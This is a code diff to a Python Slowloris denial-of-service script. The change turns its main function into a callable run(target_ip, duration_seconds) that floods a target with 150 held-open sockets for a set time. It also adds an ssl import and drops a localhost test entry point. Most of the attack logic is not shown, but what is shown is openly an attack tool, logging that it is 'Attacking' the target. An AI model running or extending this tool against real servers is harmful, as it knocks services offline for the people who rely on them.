@@ -3,8 +3,8 @@
 import logging
 import random
 import socket
-import sys
 import time
+import ssl
 args={"port":80, "sockets":150, "verbose": True, "randuseragent":True, "useproxy":False,"proxy-host":"127.0.0.1", "proxy-port":8080,"https":False,"sleeptime":15}
 
 
@@ -103,8 +103,9 @@ def slowloris_iteration():
             break
 
 
-def main(target_ip):
+def run(target_ip, duration_seconds):
     ip = target_ip
+    end_time = time.time() + duration_seconds
     socket_count = args["sockets"]
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
@@ -118,7 +119,7 @@ def main(target_ip):
             break
         list_of_sockets.append(s)
 
-    while True:
+    while time.time() < end_time:
         try:
             slowloris_iteration()
         except (KeyboardInterrupt, SystemExit):
@@ -127,8 +128,6 @@ def main(target_ip):
         except Exception as e:
             logging.debug("Error in Slowloris iteration: %s", e)
         logging.debug("Sleeping for %d seconds", args["sleeptime"])
-        time.sleep(args["sleeptime"])
+        remaining = end_time - time.time()
+        time.sleep(min(remaining, args["sleeptime"]))
 
-
-if __name__ == "__main__":
-    main(target_ip="127.0.0.1")
